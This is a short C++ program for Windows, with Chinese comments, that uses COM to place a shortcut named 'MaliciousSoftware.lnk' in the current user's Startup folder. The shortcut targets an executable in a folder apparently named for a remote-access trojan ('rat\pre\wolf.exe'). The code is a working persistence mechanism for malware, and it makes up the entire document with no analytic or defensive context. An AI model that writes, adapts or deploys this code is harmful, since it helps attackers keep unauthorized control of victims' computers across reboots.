#include <windows.h>
#include <shlobj.h>
#include <shobjidl.h>
#include <atlbase.h>
#include <string>

int main() {
    // 初始化COM库
    CoInitialize(NULL);

    // 获取启动文件夹路径
    wchar_t startupPath[MAX_PATH];
    if (SUCCEEDED(SHGetFolderPathW(NULL, CSIDL_STARTUP, NULL, 0, startupPath))) {
        // 创建快捷方式路径
        std::wstring shortcutPath = std::wstring(startupPath) + L"\\MaliciousSoftware.lnk";

        // 创建ShellLink对象
        CComPtr<IShellLink> pShellLink;
        if (SUCCEEDED(CoCreateInstance(CLSID_ShellLink, NULL, CLSCTX_INPROC_SERVER, IID_PPV_ARGS(&pShellLink)))) {
            // 设置快捷方式目标路径
            pShellLink->SetPath(L"C:\\Users\\snowwolf\\Desktop\\rat\\pre\\wolf.exe");

            // 获取IPersistFile接口
            CComPtr<IPersistFile> pPersistFile;
            if (SUCCEEDED(pShellLink->QueryInterface(IID_PPV_ARGS(&pPersistFile)))) {
                // 保存快捷方式
                pPersistFile->Save(shortcutPath.c_str(), TRUE);
            }
        }
    }

    // 释放COM库
    CoUninitialize();

    return 0;
}
